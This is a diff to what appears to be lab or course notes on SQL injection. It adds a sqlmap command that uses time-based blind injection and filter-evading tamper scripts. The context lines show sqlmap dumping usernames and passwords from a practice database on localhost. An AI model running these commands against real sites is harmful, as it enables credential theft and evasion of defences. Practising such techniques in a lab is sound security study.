@@ -66,6 +66,7 @@ sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u --tables
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users --columns
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users -C username,password --dump
+sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms="$dbms" --time-sec 10 --random-agent --tech=T --tamper=between,randomcase,space2comment --hex
 ```
 
 ```python
